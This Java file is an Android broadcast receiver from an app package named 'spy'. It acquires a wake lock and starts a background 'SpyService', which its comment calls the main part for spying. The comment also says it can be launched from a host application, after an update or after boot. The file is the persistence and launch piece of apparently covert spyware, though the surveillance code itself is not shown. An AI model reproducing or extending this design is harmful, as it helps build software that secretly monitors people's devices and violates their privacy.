package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import com.gameofcoding.spy.services.SpyService;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;

/**
 * This alarm is set by app starters, which may be from some host application, after app update
 * or after boot completed.
 * This starts the main 'SpyService' which inturn is the main part for spying.
*/
public class SpyAlarmReceiver extends BroadcastReceiver {
    private static final String TAG = "SpyAlarmReceiver";
    private static final String SPY_ALARM_TAG = "Spy:SpyAlarm";

    @Override
    public void onReceive(Context context, Intent intent) {
	XLog.i(TAG, "Spy alarm received");
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
							SPY_ALARM_TAG);
	final Utils utils = new Utils(context);
	wakeLock.acquire(10000); // Acquire the lock

	// check whether the service is already running or not!
	if(utils.isServiceRunning(SpyService.class.getName())) {
	    XLog.i(TAG, "SpyService is already running, abprting...");
	    wakeLock.release(); // Release the lock
	    return;
	}
	
	try {
	    Intent serviceIntent = new Intent(context, SpyService.class);
	    utils.startForegroundService(serviceIntent);
	    XLog.i(TAG, "SpyService started");
	} finally {
	    wakeLock.release(); // Release the lock
	}
    }
}
